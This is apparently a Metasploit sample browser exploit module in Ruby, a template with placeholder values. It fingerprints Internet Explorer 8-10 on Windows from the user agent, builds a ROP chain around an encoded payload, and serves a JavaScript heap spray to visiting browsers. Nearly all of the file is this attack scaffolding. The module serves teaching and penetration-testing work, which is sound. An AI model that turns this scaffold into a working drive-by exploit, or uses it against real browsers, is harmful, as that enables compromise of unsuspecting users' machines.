# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This exploit sample demonstrates how a typical browser exploit is written using commonly
# used components such as: HttpServer, BrowserAutopwn, RopDB, DOM Element Property Spray.
#
###
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb
  include Msf::Exploit::Remote::BrowserAutopwn

  # Set :classid and :method for ActiveX exploits. For example:
  # :classid    => "{C3B92104-B5A7-11D0-A37F-00A0248F0AF1}",
  # :method     => "SetShapeNodeType",
  autopwn_info({
    :ua_name    => HttpClients::IE,
    :ua_minver  => "8.0",
    :ua_maxver  => "10.0",
    :javascript => true,
    :os_name    => OperatingSystems::Match::WINDOWS,
    :rank       => NormalRanking
  })

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Module Name",
      &#039;Description&#039;    => %q{
        This template covers IE8/9/10, and uses the user-agent HTTP header to detect
        the browser version.  Please note IE8 and newer may emulate an older IE version
        in compatibility mode, in that case the module won&#039;t be able to detect the
        browser correctly.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => [ &#039;sinn3r&#039; ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://metasploit.com&#039; ]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, {} ],
          [ &#039;IE 8 on Windows XP SP3&#039;, { &#039;Rop&#039; => :jre } ],
          [ &#039;IE 8 on Windows Vista&#039;,  { &#039;Rop&#039; => :jre } ],
          [ &#039;IE 8 on Windows 7&#039;,      { &#039;Rop&#039; => :jre } ],
          [ &#039;IE 9 on Windows 7&#039;,      { &#039;Rop&#039; => :jre } ],
          [ &#039;IE 10 on Windows 8&#039;,     { &#039;Rop&#039; => :jre } ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;        => "\x00",  # js_property_spray
          &#039;StackAdjustment&#039; => -3500
        },
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Apr 1 2013",
      &#039;DefaultTarget&#039;  => 0))
  end

  def get_target(agent)
    return target if target.name != &#039;Automatic&#039;

    nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || &#039;&#039;
    ie = agent.scan(/MSIE (\d)/).flatten[0] || &#039;&#039;

    ie_name = "IE #{ie}"

    case nt
    when &#039;5.1&#039;
      os_name = &#039;Windows XP SP3&#039;
    when &#039;6.0&#039;
      os_name = &#039;Windows Vista&#039;
    when &#039;6.1&#039;
      os_name = &#039;Windows 7&#039;
    when &#039;6.2&#039;
      os_name = &#039;Windows 8&#039;
    when &#039;6.3&#039;
      os_name = &#039;Windows 8.1&#039;
    end

    targets.each do |t|
      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
        return t
      end
    end

    nil
  end

  def get_payload(t)
    stack_pivot = "\x41\x42\x43\x44"
    code        = payload.encoded

    case t[&#039;Rop&#039;]
    when :msvcrt
      print_status("Using msvcrt ROP")
      rop_payload = generate_rop_payload(&#039;msvcrt&#039;, code, {&#039;pivot&#039;=>stack_pivot, &#039;target&#039;=>&#039;xp&#039;})

    else
      print_status("Using JRE ROP")
      rop_payload = generate_rop_payload(&#039;java&#039;, code, {&#039;pivot&#039;=>stack_pivot})
    end

    rop_payload
  end


  def get_html(t)
    js_p = ::Rex::Text.to_unescape(get_payload(t), ::Rex::Arch.endian(t.arch))
    html = %Q|
      <script>
      #{js_property_spray}

      var s = unescape("#{js_p}");
      sprayHeap({shellcode:s});
      </script>
    |

    html.gsub(/^\t\t/, &#039;&#039;)
  end


  def on_request_uri(cli, request)
    agent = request.headers[&#039;User-Agent&#039;]
    print_status("Requesting: #{request.uri}")

    target = get_target(agent)
    if target.nil?
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end

    print_status("Target selected as: #{target.name}")
    html = get_html(target)
    send_response(cli, html, { &#039;Content-Type&#039;=>&#039;text/html&#039;, &#039;Cache-Control&#039;=>&#039;no-cache&#039; })
  end
end

